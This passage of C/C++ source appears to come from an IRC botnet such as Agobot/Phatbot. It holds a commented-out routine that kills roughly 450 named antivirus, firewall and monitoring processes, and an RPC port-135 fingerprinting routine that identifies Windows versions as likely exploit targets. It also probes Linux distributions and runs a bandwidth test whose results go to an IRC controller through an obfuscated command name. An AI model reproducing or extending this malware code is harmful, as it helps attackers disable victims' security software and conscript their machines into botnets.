		MOV			AX, WORD PTR [EDX]		// ax=(unsigned short*)*buffer;
		ADD			EBX, EAX				// cksum+=(unsigned short*)*buffer;

		SUB			ECX, 2					// size-=2;
		ADD			EDX, 2					// buffer+=2;
		CMP			ECX, 1					// size>1;
		JG			CKSUM_LOOP				// while();

		CMP			ECX, 0					// if(!size);
		JE			CKSUM_FITS				// fits if equal

CKSUM_LOOP2:

		XOR			EAX, EAX				// eax=0;
		MOV			AL, BYTE PTR [EDX]		// al=(unsigned char*)*buffer;
		ADD			EBX, EAX				// cksum+=(unsigned char*)*buffer;

		SUB			ECX, 1					// size-=1;
		ADD			EDX, 1					// buffer+=1;
		CMP			ECX, 0					// size>0;
		JG			CKSUM_LOOP2				// while();

CKSUM_FITS:

		MOV			cksum, EBX				// cksum=ebx;

		MOV			EAX, cksum				// eax=cksum;
		SHR			EAX, 16					// eax=cksum>>16;
		MOV			EBX, cksum				// ebx=cksum;
		AND			EBX, 0xffff				// ebx=cksum&0xffff;

		ADD			EAX, EBX				// eax=(cksum>>16)+(cksum&0xffff);

		MOV			EBX, EAX				// ebx=cksum;
		SHR			EBX, 16					// ebx=cksum>>16;
		ADD			EAX, EBX				// cksum+=(cksum>>16);

		MOV			cksum, EAX				// cksum=EAX;

		FEMMS
	}

#else // USE_ASM

	while(size>1) { cksum+=*buffer++; size-=2; }
	if(size) cksum+=*(unsigned char*)buffer;

	cksum=(cksum>>16)+(cksum&0xffff);
	cksum+=(cksum>>16);

#endif // USE_ASM

	return (unsigned short)(~cksum); }

/*
	This returns a static in_addr with a host assigned
*/

in_addr &to_in_addr(unsigned long lHost)
{	static in_addr ina; ina.s_addr=lHost; return ina; }

/*
	This kills all active Antivirus processes that match
	Thanks to FSecure's Bugbear.B analysis @
	http://www.f-secure.com/v-descs/bugbear_b.shtml
*/
/*
void KillAV()
{	
#ifdef WIN32

	const char *szFilenamesToKill[455] = {
		"ACKWIN32.EXE", "ADVXDWIN.EXE", "AGENTSVR.EXE", "ALERTSVC.EXE", "ALOGSERV.EXE", "AMON9X.EXE",
		"ANTI-TROJAN.EXE", "ANTIVIRUS.EXE", "ANTS.EXE", "APIMONITOR.EXE", "APLICA32.EXE", "APVXDWIN.EXE",
		"ATCON.EXE", "ATGUARD.EXE", "ATRO55EN.EXE", "ATUPDATER.EXE", "ATWATCH.EXE", "AUPDATE.EXE",
		"AUTODOWN.EXE", "AUTOUPDATE.EXE", "AVCONSOL.EXE", "AVE32.EXE", "AVGCC32.EXE", "AVGCTRL.EXE",
		"AVGNT.EXE", "AVGSERV.EXE", "AVGSERV9.EXE", "AVGUARD.EXE", "AVGW.EXE", "AVNT.EXE", "AVP.EXE",
		"AVP32.EXE", "AVPCC.EXE", "AVPDOS32.EXE", "AVPM.EXE", "AVPTC32.EXE", "AVPUPD.EXE", "AVWIN95.EXE",
		"AVWINNT.EXE", "AVWUPD32.EXE", "AVWUPSRV.EXE", "AVXMONITOR9X.EXE", "AVXMONITORNT.EXE", "AVXQUAR.EXE",
		"AckWin32.EXE", "AutoTrace.EXE", "AvSynMgr.AVSYNMGR.EXE", "AvgServ.EXE", "Avgctrl.EXE", "AvkServ.EXE",
		"Avsched32.EXE", "BD_PROFESSIONAL.EXE", "BIDEF.EXE", "BIDSERVER.EXE", "BIPCP.EXE", "BIPCPEVALSETUP.EXE",
		"BISP.EXE", "BLACKD.EXE", "BLACKICE.EXE", "BOOTWARN.EXE", "BORG2.EXE", "BS120.EXE", "BlackICE.EXE",
		"CDP.EXE", "CFGWIZ.EXE", "CFIADMIN.EXE", "CFIAUDIT.EXE", "CFINET.EXE", "CFINET32.EXE","CLAW95CF.EXE",
		"CLEAN.EXE", "CLEANER.EXE", "CLEANER3.EXE", "CLEANPC.EXE", "CMGRDIAN.EXE", "CMON016.EXE", "CONNECTIONMONITOR.EXE",
		"CPD.EXE", "CPF9X206.EXE", "CPFNT206.EXE", "CTRL.EXE", "CV.EXE", "CWNB181.EXE", "CWNTDWMO.EXE", "Claw95.EXE",
		"Claw95cf.EXE", "DEFWATCH.EXE", "DEPUTY.EXE", "DOORS.EXE", "DPF.EXE", "DPFSETUP.EXE", "DRWATSON.EXE",
		"DRWEB32.EXE", "DVP95.EXE", "DVP95_0.EXE", "ECENGINE.EXE", "EFPEADM.EXE", "ENT.EXE", "ESAFE.EXE",
		"ESCANH95.EXE", "ESCANHNT.EXE", "ESCANV95.EXE", "ESPWATCH.EXE", "ETRUSTCIPE.EXE", "EVPN.EXE", 
		"EXANTIVIRUS-CNET.EXE", "EXE.AVXW.EXE", "EXPERT.EXE", "F-AGNT95.EXE", "F-PROT.EXE", "F-PROT95.EXE",
		"F-STOPW.EXE", "FAST.EXE", "FINDVIRU.EXE", "FIREWALL.EXE", "FLOWPROTECTOR.EXE", "FP-WIN.EXE",
		"FP-WIN_TRIAL.EXE", "FPROT.EXE", "FRW.EXE", "FSAV.EXE", "FSAV530STBYB.EXE", "FSAV530WTBYB.EXE", 
		"FSAV95.EXE", "GBMENU.EXE", "GBPOLL.EXE", "GENERICS.EXE", "GUARD.EXE", "GUARDDOG.EXE", "HACKTRACERSETUP.EXE",
		"HTLOG.EXE", "HWPE.EXE", "IAMAPP.EXE", "IAMSERV.EXE", "IAMSTATS.EXE", "IBMASN.EXE", "IBMAVSP.EXE", 
		"ICLOAD95.EXE", "ICLOADNT.EXE", "ICMON.EXE", "ICSUPP95.EXE", "ICSUPPNT.EXE", "IFACE.EXE", "IFW2000.EXE",
		"IOMON98.EXE", "IPARMOR.EXE", "IRIS.EXE", "ISRV95.EXE", "JAMMER.EXE", "JEDI.EXE", "KAVLITE40ENG.EXE",
		"KAVPERS40ENG.EXE", "KAVPF.EXE", "KERIO-PF-213-EN-WIN.EXE", "KERIO-WRL-421-EN-WIN.EXE", "KERIO-WRP-421-EN-WIN.EXE",
		"KILLPROCESSSETUP161.EXE", "LDNETMON.EXE", "LDPRO.EXE", "LDPROMENU.EXE", "LDSCAN.EXE", "LOCALNET.EXE",
		"LOCKDOWN.EXE", "LOCKDOWN2000.EXE", "LOOKOUT.EXE", "LSETUP.EXE", "LUALL.EXE", "LUAU.EXE", 
		"LUCOMSERVER.EXE", "LUINIT.EXE", "LUSPT.EXE", "MCAGENT.EXE", "MCMNHDLR.EXE", "MCTOOL.EXE",
		"MCUPDATE.EXE", "MCVSRTE.EXE", "MCVSSHLD.EXE", "MFW2EN.EXE", "MFWENG3.02D30.EXE", "MGAVRTCL.EXE",
		"MGAVRTE.EXE", "MGHTML.EXE", "MGUI.EXE", "MINILOG.EXE", "MONITOR.EXE", "MOOLIVE.EXE", "MPFAGENT.EXE",
		"MPFSERVICE.EXE", "MPFTRAY.EXE", "MRFLUX.EXE", "MSCONFIG.EXE", "MSINFO32.EXE", "MSSMMC32.EXE", 
		"MU0311AD.EXE", "MWATCH.EXE", "Mcshield.EXE", "Monitor.EXE", "N32SCANW.EXE", "NAV Auto-Protect.NAV80TRY.EXE",
		"NAVAP.navapsvc.EXE", "NAVAPSVC.EXE", "NAVAPW32.EXE", "NAVDX.EXE", "NAVENGNAVEX15.NAVLU32.EXE", 
		"NAVLU32.EXE", "NAVNT.EXE", "NAVSTUB.EXE", "NAVW32.EXE", "NAVWNT.EXE", "NC2000.EXE", "NCINST4.EXE",
		"NDD32.EXE", "NEOMONITOR.EXE", "NETARMOR.EXE", "NETINFO.EXE", "NETMON.EXE", "NETSCANPRO.EXE",
		"NETSPYHUNTER-1.2.EXE", "NETSTAT.EXE", "NETUTILS.EXE", "NISSERV.EXE", "NISUM.EXE", "NMAIN.EXE",
		"NOD32.EXE", "NORMIST.EXE", "NORTON_INTERNET_SECU_3.0_407.EXE", "NPF40_TW_98_NT_ME_2K.EXE",
		"NPFMESSENGER.EXE", "NPROTECT.EXE", "NPSSVC.EXE", "NSCHED32.EXE", "NTVDM.EXE", "NTXconfig.EXE",
		"NVARCH16.EXE", "NVC95.EXE", "NWINST4.EXE", "NWService.EXE", "NWTOOL16.EXE", "Navw32.EXE", 
		"NeoWatchLog.EXE", "Nui.EXE", "Nupgrade.EXE", "OSTRONET.EXE", "OUTPOST.EXE", "OUTPOSTINSTALL.EXE", 
		"OUTPOSTPROINSTALL.EXE", "PADMIN.EXE", "PANIXK.EXE", "PAVCL.EXE", "PAVPROXY.EXE", "PAVSCHED.EXE","PAVW.EXE", 
		"PCC2002S902.EXE", "PCC2K_76_1436.EXE", "PCCIOMON.EXE", "PCCWIN98.EXE", "PCDSETUP.EXE", "PCFWALLICON.EXE",
		"PCIP10117_0.EXE", "PDSETUP.EXE", "PERISCOPE.EXE", "PERSFW.EXE", "PERSWF.EXE", "PF2.EXE","PFWADMIN.EXE",
		"PINGSCAN.EXE", "PLATIN.EXE", "POP3TRAP.EXE", "POPROXY.EXE", "POPSCAN.EXE", "PORTDETECTIVE.EXE",
		"PORTMONITOR.EXE", "PPINUPDT.EXE", "PPTBC.EXE", "PPVSTOP.EXE", "PROCESSMONITOR.EXE", "PROCEXPLORERV1.0.EXE", 
		"PROGRAMAUDITOR.EXE", "PROPORT.EXE", "PROTECTX.EXE", "PSPF.EXE", "PURGE.EXE", "PVIEW95.EXE",
		"QCONSOLE.EXE", "QSERVER.EXE", "RAV7.EXE", "RAV7WIN.EXE", "RAV8WIN32ENG.EXE", "REALMON.EXE",
		"REGEDIT.EXE", "REGEDT32.EXE", "RESCUE.EXE", "RESCUE32.EXE", "RRGUARD.EXE", "RSHELL.EXE", 
		"RTVSCN95.EXE", "RULAUNCH.EXE", "SAFEWEB.EXE", "SBSERV.EXE", "SCAN32.EXE", "SCAN95.EXE","SCANPM.EXE",
		"SCRSCAN.EXE", "SD.EXE", "SERV95.EXE", "SETUPVAMEEVAL.EXE", "SETUP_FLOWPROTECTOR_US.EXE", "SFC.EXE",
		"SGSSFW32.EXE", "SH.EXE", "SHELLSPYINSTALL.EXE", "SHN.EXE", "SMC.EXE", "SOFI.EXE", "SPF.EXE","SPHINX.EXE",
		"SPYXX.EXE", "SS3EDIT.EXE", "ST2.EXE", "SUPFTRL.EXE", "SUPPORTER5.EXE", "SWEEP95.EXE", "SYMPROXYSVC.EXE",
		"SYMTRAY.EXE", "SYSEDIT.EXE", "Sphinx.EXE", "SweepNet.SWEEPSRV.SYS.SWNETSUP.EXE", "SymProxySvc.EXE",
		"TASKMON.EXE", "TAUMON.EXE", "TBSCAN.EXE", "TC.EXE", "TCA.EXE", "TCM.EXE", "TDS-3.EXE",
		"TDS2-98.EXE", "TDS2-NT.EXE", "TFAK.EXE", "TFAK5.EXE", "TGBOB.EXE", "TITANIN.EXE", "TITANINXP.EXE",
		"TRACERT.EXE", "TRJSCAN.EXE", "TRJSETUP.EXE", "TROJANTRAP3.EXE", "UNDOBOOT.EXE", "UPDATE.EXE",
		"VBCMSERV.EXE", "VBCONS.EXE", "VBUST.EXE", "VBWIN9X.EXE", "VBWINNTW.EXE", "VCSETUP.EXE", 
		"VET32.EXE", "VET95.EXE", "VETTRAY.EXE", "VFSETUP.EXE", "VIR-HELP.EXE", "VIRUSMDPERSONALFIREWALL.EXE",
		"VNLAN300.EXE", "VNPC3000.EXE", "VPC32.EXE", "VPC42.EXE", "VPFW30S.EXE", "VPTRAY.EXE","VSCAN40.EXE",
		"VSCENU6.02D30.EXE", "VSCHED.EXE", "VSECOMR.EXE", "VSISETUP.EXE", "VSMAIN.EXE", "VSMON.EXE","VSSTAT.EXE",
		"VSWIN9XE.EXE", "VSWINNTSE.EXE", "VSWINPERSE.EXE", "VbCons.EXE", "Vet95.EXE", "VetTray.EXE","W32DSM89.EXE",
		"W9X.EXE", "WATCHDOG.EXE", "WEBSCANX.EXE", "WEBTRAP.EXE", "WFINDV32.EXE", "WGFE95.EXE", "WHOSWATCHINGME.EXE",
		"WIMMUN32.EXE", "WINRECON.EXE", "WNT.EXE", "WRADMIN.EXE", "WRCTRL.EXE", "WSBGATE.EXE", "WYVERNWORKSFIREWALL.EXE",
		"WrAdmin.EXE", "WrCtrl.EXE", "XPF202EN.EXE", "ZAPRO.EXE", "ZAPSETUP3001.EXE", "ZATUTOR.EXE"," ZAUINST.EXE",
		"ZONALM2601.EXE", "ZONEALARM.EXE", "_AVP32.EXE", "_AVPCC.EXE", "_AVPM.EXE", "agentw.EXE", "apvxdwin.EXE",
		"avkpop.EXE", "avkservice.EXE", "avkwctl9.EXE", "avpm.EXE", "blackd.EXE", "ccApp.EXE", "ccEvtMgr.EXE", 
		"ccPxySvc.EXE", "cleaner.EXE", "cleaner3.EXE", "cpd.EXE", "defalert.EXE", "defscangui.EXE", "f-stopw.EXE",
		"fameh32.EXE", "fch32.EXE", "fih32.EXE", "fnrb32.EXE", "fsaa.EXE", "fsav32.EXE", "fsgk32.EXE", "fsm32.EXE", 
		"fsma32.EXE", "fsmb32.EXE", "gbmenu.EXE", "gbpoll.EXE", "iamapp.EXE", "iamserv.EXE", "lockdown2000.EXE", 
		"notstart.EXE", "npscheck.EXE", "ntrtscan.EXE", "nvsvc32.EXE", "pavproxy.EXE", "pccntmon.EXE", "pccwin97.EXE", 
		"pcscan.EXE", "rapapp.EXE", "rtvscan.EXE", "sbserv.EXE", "vbcmserv.EXE", "vshwin32.EXE", "vsmon.EXE",
		"zapro.EXE", "zonealarm.EXE", NULL };

		for(int i=0; szFilenamesToKill[i]!=NULL; i++) {
			KillProcess(szFilenamesToKill[i]);
		}
	
#else
	KillProcess("tcpdump"); KillProcess("ethereal");
#endif
}
*/
int GetFileSize(FILE *fp)
{	long lLastPos=ftell(fp); fseek(fp, 0, SEEK_END);
	long lFileSize=ftell(fp); fseek(fp, lLastPos, SEEK_SET);
	return (int)lFileSize; }

/*
	This breaks an URL to pieces, and stores them in pURL
*/

bool ParseURL(const char *szURL, url *pURL)
{	if(!szURL) return false; CString sURL; sURL.Assign(szURL);
	// Get the protocol (ie. http), and check if its a supported protocol
	pURL->sProto.Assign(sURL.Token(0, ":"));
	if(pURL->sProto.Compare("http") && pURL->sProto.Compare("ftp")) return false;
	// Check if there are auth infos
	if(sURL.Token(1, "/").Find('@')) {
		// Get the hostname and check if it isnt empty
		pURL->sHost.Assign(sURL.Token(1, "/").Token(1, "@").Token(0, ":"));
		if(!pURL->sHost.Compare("")) return false;
		// Get the port and check if it isnt null
		pURL->iPort=atoi(sURL.Token(1, "/").Token(1, "@").Token(1, ":").CStr());
		if(!pURL->iPort) {
			if(!pURL->sProto.Compare("http")) pURL->iPort=80;
			if(!pURL->sProto.Compare("ftp")) pURL->iPort=21;
		}
		// Get the username and check if it isnt empty
		pURL->sUser.Assign(sURL.Token(1, "/").Token(0, "@").Token(0, ":"));
		if(!pURL->sUser.Compare("")) return false;
		// Get the password and check if it isnt empty
		pURL->sPassword.Assign(sURL.Token(1, "/").Token(0, "@").Token(1, ":"));
		if(!pURL->sPassword.Compare("")) return false;
	} else {
		// Get the hostname and check if it isnt empty
		pURL->sHost.Assign(sURL.Token(1, "/").Token(0, ":"));
		if(!pURL->sHost.Compare("")) return false;
		// Get the port and check if it isnt null
		pURL->iPort=atoi(sURL.Token(1, "/").Token(1, ":").CStr());
		if(!pURL->iPort) {
			if(!pURL->sProto.Compare("http")) pURL->iPort=80;
			if(!pURL->sProto.Compare("ftp")) pURL->iPort=21;
		}
	}
	// Get the request for the server
	CString sReq=sURL.Mid(sURL.Find("/")); sReq=sReq.Mid(sReq.Find("/")); sReq=sReq.Mid(sReq.Find("/"));
	pURL->sReq.Assign("/"); pURL->sReq.Append(sReq);
	return true; }

/*
	This checks if pSearch is contained in pMem
*/

bool MemContains(const char *pMem, const int iMemLen, const char *pSearch, const int iSearchLen)
{	for(int i=0;i<iMemLen-iSearchLen;i++)
		if(!memcmp(pMem+i, pSearch, iSearchLen))
			return true;
	return false; }

char rpcfp_bindstr[]=
	"\x05\x00\x0b\x03\x10\x00\x00\x00\x48\x00\x00\x00\x01\x00\x00\x00"
	"\xd0\x16\xd0\x16\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x01\x00"
	"\x80\xbd\xa8\xaf\x8a\x7d\xc9\x11\xbe\xf4\x08\x00\x2b\x10\x29\x89"
	"\x01\x00\x00\x00\x04\x5d\x88\x8a\xeb\x1c\xc9\x11\x9f\xe8\x08\x00"
	"\x2b\x10\x48\x60\x02\x00\x00\x00";


char w2kuuid_sig[]=
	"\xB0\x01\x52\x97\xCA\x59\xD0\x11\xA8\xD5\x00\xA0\xC9\x0D\x80\x51";

char wxpuuid_sig[]=
	"\x26\xB5\x55\x1D\x37\xC1\xC5\x46\xAB\x79\x63\x8F\x2A\x68\xE8\x69";


char rpcfp_inqifids[]=
	"\x05\x00\x00\x03\x10\x00\x00\x00\x18\x00\x00\x00\x01\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00";
int FpHost(const char *szHost, int iFpType)
{	switch(iFpType) {
	case FP_RPC:
	{	int iRetVal=OS_UNKNOWN;
		int sSocket=socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); char szRecvBuf[8192];
		if(sSocket==SOCKET_ERROR || sSocket==INVALID_SOCKET) return OS_UNKNOWN;
		sockaddr_in ssin; memset(&ssin, 0, sizeof(ssin)); ssin.sin_family=AF_INET;
		ssin.sin_port=htons(135); ssin.sin_addr.s_addr=ResolveAddress(szHost);
		int iErr=connect(sSocket, (sockaddr*)&ssin, sizeof(sockaddr_in));
		if(iErr!=SOCKET_ERROR)
		{	iErr=xWrite(sSocket, rpcfp_bindstr, sizeof(rpcfp_bindstr)-1);
			if(iErr==SOCKET_ERROR) { xClose(sSocket); return iRetVal; }
			iErr=xRead(sSocket, szRecvBuf, sizeof(szRecvBuf));
			if(iErr==SOCKET_ERROR) { xClose(sSocket); return iRetVal; }
			if(szRecvBuf[2]==DCE_PKT_BINDACK)
			{	iErr=xWrite(sSocket, rpcfp_inqifids, sizeof(rpcfp_inqifids)-1);
				if(iErr==SOCKET_ERROR) { xClose(sSocket); return iRetVal; }
				iErr=xRead(sSocket, szRecvBuf, sizeof(szRecvBuf));
				if(iErr==SOCKET_ERROR) { xClose(sSocket); return iRetVal; }
				if(szRecvBuf[2]==DCE_PKT_RESPONSE)
				{	if(MemContains(szRecvBuf, iErr, w2kuuid_sig, sizeof(w2kuuid_sig)-1))
					{	if(iErr<300) iRetVal=OS_WINNT; else iRetVal=OS_WIN2K; }
					else if(MemContains(szRecvBuf, iErr, wxpuuid_sig, sizeof(wxpuuid_sig)-1))
						iRetVal=OS_WINXP;
					else
						iRetVal=OS_UNKNOWN; }
				else
				{	xClose(sSocket); return iRetVal; } }
			else
			{	xClose(sSocket); return iRetVal; } }
		else
		{	xClose(sSocket); return iRetVal; }
		xClose(sSocket); return iRetVal; }
		break;
	case FP_PORT5K:
		if(ScanPort(szHost, 5000)) return OS_WINXP;
		break;
	case FP_TTL:
		return OS_UNKNOWN;
		break;
	default:
		return OS_UNKNOWN;
		break; }
	return OS_UNKNOWN; }

bool CanSpamAOL() {return false;}

#ifndef WIN32
bool GetKVersion(char **pszBuf, int iDistro)
{
	switch(iDistro)
	{
	case LINUX_TYPE_SUSE:
		system("uname -r -s -m > ktemp");
		break;
	case LINUX_TYPE_DEBIAN:
		system("uname -r -o -m > ktemp");
		break;
	default:
		system("uname -r -m > ktemp");
		break;
	}
	
	FILE *fp=fopen("ktemp", "r"); if(!fp) return false;
	fseek(fp, 0, SEEK_END); long lFileSize=ftell(fp); fseek(fp, 0, SEEK_SET);
	if(lFileSize==0) { fclose(fp); return false; }
	char szKVer[64];
	if(fread(szKVer, sizeof(char), lFileSize, fp)<1) { fclose(fp); return false; }
	for(int i=0;i<lFileSize;i++) if(szKVer[i]=='\n' || szKVer[i]=='\r') szKVer[i]='\0';
	
	*pszBuf=(char*)malloc(lFileSize); if(!*pszBuf) { fclose(fp); return false; }
		
	sprintf(*pszBuf, "%s", szKVer);

	fclose(fp);
	
	system("rm -f ktemp");
	
	return true;
}

bool GetVersion(char **pszBuf, int iDistro)
{
	switch(iDistro)
	{
	case LINUX_TYPE_SUSE:
		{	FILE *fp=fopen("/etc/SuSE-release", "r");
			if(!fp) return false;
			fseek(fp, 0, SEEK_END); long lFileSize=ftell(fp); fseek(fp, 0, SEEK_SET);
			if(lFileSize==0) { fclose(fp); return false; }
			char szSuSEVer[64];
			if(fread(szSuSEVer, sizeof(char), lFileSize, fp)<1) { fclose(fp); return false; }
			for(int i=0;i<lFileSize;i++) if(szSuSEVer[i]=='\n' || szSuSEVer[i]=='\r') szSuSEVer[i]='\0';
			
			char *szVersionNum;
			strtok(szSuSEVer, " "); strtok(NULL, " "); szVersionNum=strtok(NULL, " ");

			*pszBuf=(char*)malloc(256); if(!*pszBuf) { fclose(fp); return false; }
			
			sprintf(*pszBuf, "SuSE %s", szVersionNum);

			fclose(fp); return true;
		}
		break;
	case LINUX_TYPE_REDHAT:
		{	FILE *fp=fopen("/etc/redhat-release", "r");
			if(!fp) return false;
			fseek(fp, 0, SEEK_END); long lFileSize=ftell(fp); fseek(fp, 0, SEEK_SET);
			if(lFileSize==0) { fclose(fp); return false; }
			char szRedHatVer[64];
			if(fread(szRedHatVer, sizeof(char), lFileSize, fp)<1) { fclose(fp); return false; }
			for(int i=0;i<lFileSize;i++) if(szRedHatVer[i]=='\n' || szRedHatVer[i]=='\r') szRedHatVer[i]='\0';
			
			char *szVersionNum; char *szReleaseName;
			if(szRedHatVer[0]=='r') // RedHat versions <= 5.0
			{	strtok(szRedHatVer, " "); szVersionNum=strtok(NULL, " ");
				char *szTemp=strtok(NULL, " "); szTemp=strtok(szTemp, "(");
				szReleaseName=strtok(szTemp, ")");
			}
			else if(szRedHatVer[0]=='R') // RedHat versions >= 5.2
			{	strtok(szRedHatVer, " "); strtok(NULL, " "); strtok(NULL, " "); strtok(NULL, " "); szVersionNum=strtok(NULL, " ");
				char *szTemp=strtok(NULL, " "); szTemp=strtok(szTemp, "(");
				szReleaseName=strtok(szTemp, ")");
			}
			else { fclose(fp); return false; }

			*pszBuf=(char*)malloc(256); if(!*pszBuf) { fclose(fp); return false; }
			
			sprintf(*pszBuf, "Red Hat %s (%s)", szVersionNum, szReleaseName);

			fclose(fp); return true;
		}
		break;
	case LINUX_TYPE_DEBIAN:
		{	FILE *fp=fopen("/etc/debian_version", "r");
			if(!fp) return false;
			fseek(fp, 0, SEEK_END); long lFileSize=ftell(fp); fseek(fp, 0, SEEK_SET);
			if(lFileSize==0) { fclose(fp); return false; }
			char szDebVer[16];
			if(fread(szDebVer, sizeof(char), lFileSize, fp)<1) { fclose(fp); return false; }
			for(int i=0;i<lFileSize;i++) if(szDebVer[i]=='\n' || szDebVer[i]=='\r') szDebVer[i]='\0';

			*pszBuf=(char*)malloc(strlen(szDebVer)+strlen("Debian ")+1); if(!*pszBuf) { fclose(fp); return false; }
			sprintf(*pszBuf, "Debian %s", szDebVer);

			fclose(fp); return true;
		}
		break;
	case LINUX_TYPE_SLACKWARE:
		{
			*pszBuf=(char*)malloc(256); if(!*pszBuf) return false;
			sprintf(*pszBuf, "Slackware");
		}
		break;
	case LINUX_TYPE_MANDRAKE:
		{
			*pszBuf=(char*)malloc(256); if(!*pszBuf) return false;
			sprintf(*pszBuf, "Mandrake");
		}
		break;
	case LINUX_TYPE_YELLOWDOG:
		{
			*pszBuf=(char*)malloc(256); if(!*pszBuf) return false;
			sprintf(*pszBuf, "Yellowdog");
		}
		break;
	case LINUX_TYPE_TURBOLINUX:
		{
			*pszBuf=(char*)malloc(256); if(!*pszBuf) return false;
			sprintf(*pszBuf, "TurboLinux");
		}
		break;
	case LINUX_TYPE_UNITEDLINUX:
		{
			*pszBuf=(char*)malloc(256); if(!*pszBuf) return false;
			sprintf(*pszBuf, "UnitedLinux");
		}
		break;
	case LINUX_TYPE_FREEBSD:
		{
			*pszBuf=(char*)malloc(256); if(!*pszBuf) return false;
			sprintf(*pszBuf, "FreeBSD");
		}
		break;
	default:
		return false;
		break;
	}
	return false;
}

int GetDistro()
{
	FILE *fp;
	
	fp=fopen("/etc/SuSE-release", "r");
	if(fp) { fclose(fp); return LINUX_TYPE_SUSE; }
	
	fp=fopen("/etc/redhat-release", "r");
	if(fp) { fclose(fp); return LINUX_TYPE_REDHAT; }

	fp=fopen("/etc/debian_version", "r");
	if(fp) { fclose(fp); return LINUX_TYPE_DEBIAN; }

	fp=fopen("/etc/mandrake-release", "r");
	if(fp) { fclose(fp); return LINUX_TYPE_MANDRAKE; }

	fp=fopen("/etc/yellowdog-release", "r");
	if(fp) { fclose(fp); return LINUX_TYPE_YELLOWDOG; }

	fp=fopen("/etc/turbolinux-release", "r");
	if(fp) { fclose(fp); return LINUX_TYPE_TURBOLINUX; }

	fp=fopen("/etc/slackware-version", "r");
	if(fp) { fclose(fp); return LINUX_TYPE_SLACKWARE; }

	fp=fopen("/etc/UnitedLinux-release", "r");
	if(fp) { fclose(fp); return LINUX_TYPE_UNITEDLINUX; }
	
	fclose(fp); return LINUX_TYPE_UNKNOWN;
}

#endif //WIN32

/*








#define NUM_KILOBYTES 200

// Return speed to host:80 in kbit per second

unsigned long GetSpeed(const char *szHost) {
	if(strlen(szHost)>255) return 0;
	unsigned long lBufSize=NUM_KILOBYTES*1024; CSocket sMSWeb;
	if(!sMSWeb.Connect(szHost, 80)) return 0;

	char *szBuf=new char[lBufSize+3];

	int iChar=(char)brandom(1,255);
	memset(szBuf,	0,		lBufSize+1	);
	memset(szBuf,	iChar,	lBufSize	);

	unsigned long lStrLen=strlen(szBuf);

	char *szPostReq=new char[lBufSize+1002];
	sprintf(szPostReq, "POST / HTTP/1.0\r\n"
		"Host: %s\r\n"
		"Content-Length: %d\r\n"
		"\r\n",
		szHost, lStrLen);
	strcat(szPostReq, szBuf);
	strcat(szPostReq, "\r\n");
	
	lStrLen=strlen(szPostReq);

	unsigned long lStartMS=GetTickCount();

	for(unsigned long l=0; l<lStrLen; l+=1024) {
		if(lStrLen-l < 1024) {
			if(!sMSWeb.Write(szPostReq+l, lStrLen-l))
			{	sMSWeb.Disconnect();
				delete [] szBuf; delete[] szPostReq;
				return 0; }
		} else {
			if(!sMSWeb.Write(szPostReq+l, 1024))
			{	sMSWeb.Disconnect();
				delete [] szBuf; delete[] szPostReq;
				return 0; }
		}
	}

	unsigned long lEndMS=GetTickCount();

	float fElapsedS=(float)(lEndMS-lStartMS)/1000.0f;
	if(fElapsedS==0.0f) fElapsedS=1.0f;

	float fBytesPS=(float)lStrLen/fElapsedS;	// Get bytes per second
	float fKBytesPS=fBytesPS/1024.0f;			// Get kilobytes per second
	float fBitsPS=fBytesPS*8.0f;				// Get bits per second
	float fKBitsPS=fBitsPS/1024.0f;				// Get kilobits per second

	sMSWeb.Disconnect();
	delete [] szBuf; delete[] szPostReq;

	return (unsigned long)fKBitsPS; }

void DoSpeedTest(speedtest_data *pData)
{
	unsigned long lProbe1=0, lProbe2=0;

	const char* EU[] = {
		"www.schlund.net",
		"www.utwente.nl",
		"verio.fr",
		"www.1und1.de",
		"www.switch.ch",
		"www.belwue.de",
		"de.yahoo.com"
	};
	const char* US[] = {
		"www.xo.net",
		"www.stanford.edu",
		"www.verio.com",
		"www.nocster.com",
		"www.rit.edu",
		"www.cogentco.com",
		"www.burst.net",
		"nitro.ucsc.edu",
		"www.level3.com",
		"www.above.net"
	};
	const char* ASIA[] = {
		"www.lib.nthu.edu.tw",
		"www.st.lib.keio.ac.jp",
		"www.d1asia.com",
		"www.nifty.com",
		"yahoo.co.jp" 
	};
	
	init_random();

	// EU
	lProbe1=GetSpeed(EU[brandom(0,6)]);
	lProbe2=GetSpeed(EU[brandom(0,6)]);
	pData->lEUSpeed=(lProbe1+lProbe2)/2;

	// US
	lProbe1=GetSpeed(US[brandom(0,9)]);
	lProbe2=GetSpeed(US[brandom(0,9)]);
	pData->lUSSpeed=(lProbe1+lProbe2)/2;

	// ASIA
	lProbe1=GetSpeed(ASIA[brandom(0,4)]);
	lProbe2=GetSpeed(ASIA[brandom(0,4)]);
	pData->lASIASpeed=(lProbe1+lProbe2)/2;

	pData->lTotalSpeed=(pData->lEUSpeed+pData->lUSSpeed+pData->lASIASpeed)/3;
}





CSpeedTest::CSpeedTest()
{
	m_speedData.lEUSpeed=0; m_speedData.lUSSpeed=0;
	m_speedData.lASIASpeed=0; m_speedData.lTotalSpeed=0;
	m_bDataSet=false; }

CSpeedTest::~CSpeedTest() { 
m_bDataSet=false;  }


void CSpeedTest::Init()
{
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdSpeedTest, dp(2,79,19,16,5,5,4,20,5,19,20,0),	this);
}

bool CSpeedTest::HandleCommand(CMessage *pMsg)
{

	if(!pMsg->sCmd.Compare(m_cmdSpeedTest.sName.Str()))
	{
	
	DoSpeedTest(&m_speedData);
	m_bDataSet=true;


	if(m_bDataSet)
	{
	
		CString sTempBuf; 
		sTempBuf.Format("speed: europe[%d kbit/s] usa[%d kbit/s] asia[%d kbit/s] all[%d kbit/s]",
		m_speedData.lEUSpeed, m_speedData.lUSSpeed, 
		m_speedData.lASIASpeed, m_speedData.lTotalSpeed);
    	g_cMainCtrl.m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice, pMsg->sReplyTo, \
		sTempBuf);

	}	

	}

return true; 

}
*/